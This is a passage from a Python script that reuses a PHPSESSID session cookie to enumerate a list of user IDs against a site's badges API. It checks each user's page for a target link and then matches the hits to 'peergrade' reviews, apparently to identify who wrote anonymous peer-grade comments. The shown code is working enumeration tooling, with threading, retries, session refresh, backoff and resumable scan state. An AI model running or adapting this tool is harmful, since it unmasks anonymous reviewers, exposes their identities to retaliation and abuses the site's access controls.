	if parsed:
		PHPSESSID = parsed
		new_cookie = f"PHPSESSID={parsed}"
		print("[+] Session refreshed.")
		return new_cookie
	print("[!] No new session provided; continuing with current cookie (may fail).")
	return None


def check_target_for_user(user_id: int, cookie: str | None, timeout: float, retries: int) -> tuple[int, bool, int | None, str | None, float, str | None]:
	started_at = time.time()
	url = API_URL.format(page_id=BADGES_PAGE_ID, user_id=user_id)
	body, status, error = fetch_text(url, cookie, timeout, retries, REQUEST_RETRY_DELAY)
	elapsed = time.time() - started_at
	if error:
		return user_id, False, status, error, elapsed, None
	return user_id, body_contains_target_link(body or "", TARGET_LINK), status, None, elapsed, body


def is_dns_resolution_error(status: int | None, error: str | None) -> bool:
	if not error:
		return False
	error_lower = error.lower()
	return (
		"name or service not known" in error_lower
		or "temporary failure in name resolution" in error_lower
		or "nodename nor servname provided" in error_lower
	)


def is_transient_target_error(status: int | None, error: str | None) -> bool:
	if not error:
		return False
	error_lower = error.lower()
	if "timeout" in error_lower:
		return True
	if status in {408, 425, 429, 500, 502, 503, 504, 520, 522, 524}:
		return True
	transient_markers = (
		"temporarily unavailable",
		"temporarily overloaded",
		"connection reset by peer",
		"remote end closed connection",
		"connection aborted",
		"connection refused",
	)
	return any(marker in error_lower for marker in transient_markers)


def load_ids() -> tuple[list[int], int, int, str]:
	mode = str(IDS_SOURCE)
	order = str(IDS_ORDER).lower()
	reverse = order != "asc"

	def normalize_ids(ids: list[int]) -> list[int]:
		return sorted(set(ids), reverse=reverse)
	if mode == "builtin":
		return normalize_ids(BUILTIN_USER_IDS), 0, 0, "builtin"
	if mode == "scan_state":
		scan_state_path = resolve_scan_state_path_for_read(TARGET_LINK)
		state_file = Path(scan_state_path)
		state_data: dict = {}
		ids_block: dict = {}
		state_target_key = ""
		if state_file.exists():
			try:
				state_data = json.loads(state_file.read_text(encoding="utf-8"))
			except Exception:
				state_data = {}
			raw_ids_block = state_data.get("ids", {})
			if isinstance(raw_ids_block, dict):
				ids_block = raw_ids_block
			target_block = state_data.get("target", {})
			if isinstance(target_block, dict):
				state_target_key = str(target_block.get("key", "")).strip().lower()

		current_target_key = build_target_state_key(TARGET_LINK)
		matches_target = state_target_key == current_target_key

		if state_file.exists() and not matches_target:
			print(
				"[i] Existing scan_state target does not match current target; rescanning all built-in IDs.",
				file=sys.stderr,
			)
			return normalize_ids(BUILTIN_USER_IDS), 0, 0, "builtin-target-reset"

		ids: list[int] = []
		raw_unresolved = ids_block.get("unresolved", []) if isinstance(ids_block, dict) else []
		if isinstance(raw_unresolved, list):
			for value in raw_unresolved:
				try:
					ids.append(int(value))
				except (TypeError, ValueError):
					continue

		if not ids:
			hits_in_state: set[int] = set()
			raw_hits = ids_block.get("hits", []) if isinstance(ids_block, dict) else []
			if isinstance(raw_hits, list):
				for value in raw_hits:
					try:
						hits_in_state.add(int(value))
					except (TypeError, ValueError):
						continue

			known_ids: set[int] = set()
			for bucket in ("done", "hits", "failed", "unresolved"):
				values = ids_block.get(bucket, []) if isinstance(ids_block, dict) else []
				if not isinstance(values, list):
					continue
				for value in values:
					try:
						known_ids.add(int(value))
					except (TypeError, ValueError):
						continue

			missing_ids = sorted(set(BUILTIN_USER_IDS) - known_ids, reverse=reverse)
			if not missing_ids and hits_in_state:
				print("[i] scan_state already complete for this target (hits present and unresolved=0); skipping target-check phase.")
				return [], 0, 0, "scan_state-complete"
			if missing_ids:
				print(
					f"[i] No unresolved IDs in scan state; scanning {len(missing_ids)} missing built-in IDs.",
					file=sys.stderr,
				)
				return normalize_ids(missing_ids), 0, 0, "scan_state-missing"

		if not ids:
			# All IDs are accounted for (done + failed) but no hits yet.
			# Re-queue failed IDs so transient 504/timeout errors can be retried;
			# skip confirmed no-match ("done") IDs to avoid redundant checks.
			done_ids_in_state: set[int] = set()
			failed_ids_in_state: set[int] = set()
			for value in (ids_block.get("done", []) if isinstance(ids_block, dict) else []):
				try:
					done_ids_in_state.add(int(value))
				except (TypeError, ValueError):
					continue
			for value in (ids_block.get("failed", []) if isinstance(ids_block, dict) else []):
				try:
					failed_ids_in_state.add(int(value))
				except (TypeError, ValueError):
					continue
			retry_ids = sorted(
				(set(BUILTIN_USER_IDS) - done_ids_in_state) | failed_ids_in_state,
				reverse=reverse,
			)
			if retry_ids:
				print(
					f"[i] Re-queuing {len(retry_ids)} failed/unchecked IDs for retry "
					f"(skipping {len(done_ids_in_state)} confirmed no-match IDs).",
					file=sys.stderr,
				)
				return normalize_ids(retry_ids), 0, 0, "scan_state-retry-failed"
			print(
				f"[!] No IDs found in scan state ({scan_state_path}) for key 'unresolved'. "
				"Falling back to built-in IDs.",
				file=sys.stderr,
			)
			return normalize_ids(BUILTIN_USER_IDS), 0, 0, "builtin-fallback"
		return normalize_ids(ids), 0, 0, "scan_state"

	print(f"[!] Unsupported ids.source: {mode}", file=sys.stderr)
	return [], 0, 0, mode


def save_state(
	all_ids: list[int],
	hits: list[int],
	unresolved: list[int],
	failed: list[int],
	probes_ok: int,
	probe_total: int,
	source: str,
	*,
	verbose: bool = True,
) -> None:
	scan_state_path = build_target_scan_state_path(TARGET_LINK)
	current_target_link = TARGET_LINK.strip()
	current_target_key = build_target_state_key(current_target_link)

	previous_ids = {
		"done": set(),
		"hits": set(),
		"failed": set(),
		"unresolved": set(),
	}
	state_file = Path(scan_state_path)
	previous_target_key = ""
	if state_file.exists():
		try:
			previous = json.loads(state_file.read_text(encoding="utf-8"))
			target_block = previous.get("target", {})
			if isinstance(target_block, dict):
				previous_target_key = str(target_block.get("key", "")).strip().lower()
			if previous_target_key == current_target_key:
				ids_block = previous.get("ids", {})
				for key in previous_ids:
					values = ids_block.get(key, [])
					if isinstance(values, list):
						for value in values:
							try:
								previous_ids[key].add(int(value))
							except (TypeError, ValueError):
								continue
		except Exception:
			pass

	current_hits = set(hits)
	current_failed = set(failed)
	current_unresolved = set(unresolved)

	merged_hits = previous_ids["hits"] | current_hits
	merged_failed = (previous_ids["failed"] - merged_hits) | current_failed
	merged_unresolved = current_unresolved

	all_known = (
		set(all_ids)
		| previous_ids["done"]
		| previous_ids["hits"]
		| previous_ids["failed"]
		| previous_ids["unresolved"]
		| merged_unresolved
		| merged_hits
		| merged_failed
	)

	merged_done = all_known - merged_unresolved - merged_failed - merged_hits
	done_ids = sorted(merged_done)
	hit_ids = sorted(merged_hits)
	failed_ids = sorted(merged_failed)
	unresolved_ids = sorted(merged_unresolved)

	state = {
		"timestamp_utc": datetime.now(timezone.utc).isoformat(),
		"source": source,
		"counts": {
			"total_ids": len(all_known),
			"done_ids": len(done_ids),
			"unresolved_ids": len(unresolved_ids),
			"failed_ids": len(failed_ids),
			"hit_ids": len(hit_ids),
		},
		"target": {
			"link": current_target_link,
			"key": current_target_key,
		},
		"ids": {
			"hits": hit_ids,
			"unresolved": unresolved_ids,
			"failed": failed_ids,
			"done": done_ids,
		},
	}
	Path(scan_state_path).write_text(json.dumps(state, indent=2), encoding="utf-8")
	if verbose:
		print(f"Saved scan state to: {scan_state_path}")


def run_target_checks(
	ids: list[int],
	cookie: str | None,
	max_hits: int | None = None,
	progress_callback=None,
) -> tuple[list[int], list[int], list[int], int, int, int]:
	workers = int(TARGET_WORKERS)
	target_timeout = float(TARGET_TIMEOUT)
	target_retries = int(TARGET_RETRIES)
	target_delay = float(TARGET_DELAY)
	wait_heartbeat = float(TARGET_WAIT_HEARTBEAT_SECONDS)
	stop_after_timeouts = int(TARGET_STOP_AFTER_TIMEOUTS)
	stop_after_dns_errors = int(TARGET_STOP_AFTER_DNS_ERRORS)
	recheck_timeouts = bool(TARGET_RECHECK_TIMEOUTS)
	recheck_timeout = float(TARGET_RECHECK_TIMEOUT)
	recheck_delay = float(TARGET_RECHECK_DELAY)
	transient_backoff = float(TARGET_TRANSIENT_BACKOFF_SECONDS)
	active_cookie = cookie
	refresh_retry_done_for_user: set[int] = set()

	if workers < 1 or stop_after_timeouts < 1 or stop_after_dns_errors < 1:
		print("[!] Invalid target settings in runtime defaults", file=sys.stderr)
		return [], list(ids), [], 0, 0, 0

	print(
		f"\nChecking {len(ids)} IDs on pageId={BADGES_PAGE_ID} "
		f"for target link with {workers} worker(s)..."
	)
	if max_hits is not None and max_hits > 0:
		print(f"[i] Optimized stop condition: stop after finding {max_hits} hit ID(s).")
		print(f"[i] Using normal scan params: workers={workers}, timeout={target_timeout:.0f}s, delay={target_delay:.1f}s")

	remaining_ids = list(ids)

	hits: list[int] = []
	hit_set: set[int] = set()
	unresolved: set[int] = set(ids)
	failed: set[int] = set()
	timed_out_ids: list[int] = []
	transient_error_ids: list[int] = []
	checked = 0
	timeout_count = 0
	dns_error_count = 0
	recheck_checked = 0
	recheck_total = 0

	try:
		with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
			future_to_user: dict[concurrent.futures.Future, int] = {}
			next_index = 0
			initial = min(workers, len(remaining_ids))
			for _ in range(initial):
				user_id = remaining_ids[next_index]
				next_index += 1
				future = executor.submit(check_target_for_user, user_id, active_cookie, target_timeout, target_retries)
				future_to_user[future] = user_id

			stop_early = False
			while future_to_user:
				done, _ = concurrent.futures.wait(
					future_to_user,
					timeout=max(1.0, wait_heartbeat),
					return_when=concurrent.futures.FIRST_COMPLETED,
				)
				if not done:
					print(
						f"[i] waiting... checked={checked}/{len(ids)} in_flight={len(future_to_user)} hits={len(hits)}"
					)
					continue

				for future in done:
					future_to_user.pop(future, None)
					checked += 1
					user_id, is_hit, status, error, elapsed, resp_body = future.result()
					print(f"[*] target-check {checked}/{len(ids)} userId={user_id} done")

					if not error and is_session_expired_body(resp_body):
						print(f"[!] Session expired detected on userId={user_id} response; requeueing.")
						new_cookie = prompt_new_phpsessid("Session expired — the server rejected this response.")
						if new_cookie:
							active_cookie = new_cookie
						requeue_future = executor.submit(check_target_for_user, user_id, active_cookie, target_timeout, target_retries)
						future_to_user[requeue_future] = user_id
						checked -= 1
						if target_delay > 0:
							time.sleep(target_delay)
						continue

					if error:
						if user_id not in refresh_retry_done_for_user and is_transient_target_error(status, error):
							new_cookie = prompt_new_phpsessid(
								f"Requests started failing at userId={user_id} ({error}). Refresh session and retry this ID?"
							)
							if new_cookie:
								active_cookie = new_cookie
								refresh_retry_done_for_user.add(user_id)
								retry_future = executor.submit(check_target_for_user, user_id, active_cookie, target_timeout, target_retries)
								future_to_user[retry_future] = user_id
								checked -= 1
								if target_delay > 0:
									time.sleep(target_delay)
								continue
						unresolved.discard(user_id)
						failed.add(user_id)
						if "timeout" in error.lower():
							timeout_count += 1
							timed_out_ids.append(user_id)
						if is_transient_target_error(status, error):
							transient_error_ids.append(user_id)
						if is_dns_resolution_error(status, error):
							dns_error_count += 1
						print(
							f"[-] target-check userId={user_id}: {status if status is not None else '?'} ({error}) "
							f"[{elapsed:.1f}s | hits={len(hits)} timeouts={timeout_count} dns={dns_error_count}]"
						)
						if is_transient_target_error(status, error) and transient_backoff > 0:
							print(f"[i] transient error — backing off {transient_backoff:.0f}s before next request...")
							time.sleep(transient_backoff)
						if timeout_count >= stop_after_timeouts or dns_error_count >= stop_after_dns_errors:
							reason = "timeouts" if timeout_count >= stop_after_timeouts else "DNS errors"
							print(f"[!] Too many {reason}; stopping early and preserving remaining IDs for retry.")
							stop_early = True
							for pending in list(future_to_user):
								if not pending.done():
									pending.cancel()
							future_to_user.clear()
							break
					elif is_hit:
						unresolved.discard(user_id)
						failed.discard(user_id)
						if user_id not in hit_set:
							hit_set.add(user_id)
							hits.append(user_id)
						print(f"[+] target-hit userId={user_id} [{elapsed:.1f}s | hits={len(hits)}]")
						if max_hits is not None and max_hits > 0 and len(hit_set) >= max_hits:
							print(f"[+] Reached expected hit count ({max_hits}); stopping target checks early.")
							stop_early = True
							for pending in list(future_to_user):
								if not pending.done():
									pending.cancel()
							future_to_user.clear()
							if progress_callback is not None:
								progress_callback(sorted(set(hits)), sorted(unresolved), sorted(failed))
							break
					else:
						unresolved.discard(user_id)
						failed.discard(user_id)
						print(f"[ ] target-check userId={user_id}: no match [{elapsed:.1f}s | hits={len(hits)}]")

					if progress_callback is not None:
						progress_callback(sorted(set(hits)), sorted(unresolved), sorted(failed))

					if not stop_early and next_index < len(remaining_ids):
						next_user = remaining_ids[next_index]
						next_index += 1
						next_future = executor.submit(check_target_for_user, next_user, active_cookie, target_timeout, target_retries)
						future_to_user[next_future] = next_user
						if target_delay > 0:
							time.sleep(target_delay)

					if stop_early:
						break
	except KeyboardInterrupt:
		print("\n[!] Interrupted during target checks. Showing partial results...")

	if recheck_timeouts and not (max_hits is not None and max_hits > 0 and len(hit_set) >= max_hits):
		recheck_ids = sorted(set(timed_out_ids) | set(transient_error_ids) | set(unresolved))
		recheck_total = len(recheck_ids)
		if recheck_ids:
			transient_only_count = len(set(recheck_ids) - set(timed_out_ids) - set(unresolved))
			pending_count = len(set(unresolved))
			print(
				f"\nRechecking {len(recheck_ids)} transient/pending IDs serially "
				f"(timeout={recheck_timeout}s, timed_out={len(set(timed_out_ids))}, transient={transient_only_count}, pending={pending_count})..."
			)
		for idx, user_id in enumerate(recheck_ids, start=1):
			recheck_checked += 1
			result_user_id, is_hit, status, error, elapsed, resp_body = check_target_for_user(
				user_id,
				active_cookie,
				recheck_timeout,
				0,
			)
			print(f"[*] recheck {idx}/{len(recheck_ids)} userId={result_user_id} done")

			if not error and is_session_expired_body(resp_body):
				print(f"[!] Session expired detected on recheck userId={result_user_id}; keeping as unresolved for next run.")
				continue

			if error:
				unresolved.discard(result_user_id)
				failed.add(result_user_id)
				print(f"[-] recheck userId={result_user_id}: {status if status is not None else '?'} ({error}) [{elapsed:.1f}s]")
			elif is_hit:
				unresolved.discard(result_user_id)
				failed.discard(result_user_id)
				if result_user_id not in hit_set:
					hit_set.add(result_user_id)
					hits.append(result_user_id)
				print(f"[+] recheck-hit userId={result_user_id} [{elapsed:.1f}s]")
			else:
				unresolved.discard(result_user_id)
				failed.discard(result_user_id)
				print(f"[ ] recheck userId={result_user_id}: no match [{elapsed:.1f}s]")

			if progress_callback is not None:
				progress_callback(sorted(set(hits)), sorted(unresolved), sorted(failed))
			if recheck_delay > 0 and idx < len(recheck_ids):
				time.sleep(recheck_delay)

	print("\n=== Target link results ===")
	print(f"IDs checked (first pass): {checked}/{len(ids)}")
	if recheck_timeouts and recheck_total:
		print(f"IDs checked (recheck pass): {recheck_checked}/{recheck_total}")
	print(f"IDs containing target link: {len(hits)}")
	print(f"Failed IDs: {len(failed)}")
	print(f"Timeout errors: {timeout_count}")
	print(f"DNS errors: {dns_error_count}")
	print(f"Unresolved IDs: {len(unresolved)}")

	return sorted(hits), sorted(unresolved), sorted(failed), timeout_count, dns_error_count, checked


def main() -> int:
	print_title()
	bootstrap_startup_inputs()

	cookie = load_cookie()
	peergrade_reviews = fetch_peergrade_reviews_for_target(cookie)
	print(f"[i] Peergrade comments found: {len(peergrade_reviews)}")
	expected_review_count = len(peergrade_reviews)
	ids, probes_ok, probe_total, source = load_ids()
	reverse = str(IDS_ORDER).lower() != "asc"
	scan_state_path = resolve_scan_state_path_for_read(TARGET_LINK)
	scan_state = read_scan_state(scan_state_path)
	state_hits: list[int] = []
	state_failed: list[int] = []
	state_unresolved: list[int] = []
	if scan_state:
		ids_block = scan_state.get("ids", {})
		if isinstance(ids_block, dict):
			for value in ids_block.get("hits", []):
				try:
					state_hits.append(int(value))
				except (TypeError, ValueError):
					continue
			for value in ids_block.get("failed", []):
				try:
					state_failed.append(int(value))
				except (TypeError, ValueError):
					continue
			for value in ids_block.get("unresolved", []):
				try:
					state_unresolved.append(int(value))
				except (TypeError, ValueError):
					continue
	if source == "scan_state-complete":
		state_hits = sorted(set(state_hits))
		if expected_review_count > 0 and len(state_hits) != expected_review_count:
			print(
				f"[i] scan_state has {len(state_hits)} hit(s), but peergrade shows {expected_review_count} comment(s); rescanning full ID list.")
			ids = sorted(set(BUILTIN_USER_IDS), reverse=reverse)
			source = "builtin-peergrade-sync"
			state_hits = []
	elif source in {"scan_state", "scan_state-missing"}:
		state_hits = sorted(set(state_hits))
		state_failed = sorted(set(state_failed))
		state_unresolved = sorted(set(state_unresolved))
		if expected_review_count > 0 and len(state_hits) < expected_review_count and state_failed:
			retry_ids = sorted(set(ids) | set(state_failed) | set(state_unresolved), reverse=reverse)
			print(
				f"[i] scan_state has {len(state_hits)} hit(s), but peergrade shows {expected_review_count} comment(s); "
				f"retrying {len(retry_ids)} queued/failed ID(s) instead of only {len(ids)} missing ID(s)."
			)
			ids = retry_ids
			source = "scan_state-peergrade-retry"

	print("\n=== Done ===")
	print(f"IDs queued for target-check: {len(ids)}")
	if source == "scan_state-complete":
		print(f"Reusing hits from completed scan_state: {len(state_hits)}")

	hits: list[int] = []
	unresolved: list[int] = []
	failed: list[int] = []
	state_update_interval = float(STATE_UPDATE_INTERVAL_SECONDS)
	if state_update_interval < 0:
		state_update_interval = 0.0
	last_state_update_at = 0.0

	def progress_state_update(current_hits: list[int], current_unresolved: list[int], current_failed: list[int]) -> None:
		nonlocal last_state_update_at
		now = time.time()
		if now - last_state_update_at < state_update_interval:
			return
		save_state(
			ids,
			current_hits,
			current_unresolved,
			current_failed,
			probes_ok,
			probe_total,
			source,
			verbose=False,
		)
		last_state_update_at = now

	if TARGET_ENABLED and ids:
		hits, unresolved, failed, _, _, _ = run_target_checks(ids, cookie, None, progress_state_update)
	elif source == "scan_state-complete":
		hits = state_hits
		unresolved = []
		failed = []
		print("Skipping target-check phase because scan_state is already complete.")
	elif TARGET_ENABLED and expected_review_count == 0:
		print("No peergrade comments found for target; skipping target-link checks.")
	elif not ids:
		print("No IDs available for target-link checks.")

	analyze_peergrade_for_hits(hits, cookie, preloaded_reviews=peergrade_reviews)

	save_state(
		ids,
		hits,
		unresolved if unresolved else [],
		failed if failed else [],
		probes_ok,
		probe_total,
		source,
		verbose=True,
	)
	return 0


if __name__ == "__main__":
	raise SystemExit(main())
